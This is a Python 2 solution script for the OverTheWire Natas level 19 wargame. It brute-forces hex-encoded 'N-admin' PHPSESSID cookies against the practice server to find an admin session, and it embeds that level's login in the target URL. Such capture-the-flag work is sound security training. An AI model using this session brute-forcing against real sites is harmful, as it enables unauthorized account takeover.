# Library for POST requests.
import requests

# Target URL
target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
# Confirmation we are in.
accept_me = "You are an admin."

# Verifying we can connect.
req = requests.get(target)
if req.status_code != requests.codes.ok:
        raise ValueError('Poof! Unable to connect to target :(')
else:
        print 'Connected to target. Starting session brute force...'

# Iterate each session and check if there's one with admin access.
for i in range(1,641):
        if i % 10 == 0:
                print 'Checked '+str(i)+' sessions...'
	# Try our luck with the discovered '-admin' ending.
        cookies = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
        req = requests.get(target, cookies=cookies)
        # Did we find the right session?
        if req.content.find(accept_me) != -1:
                print 'Got it! Session='+str(i)
                print req.content
                break
print 'Successfully brute-forced session.'

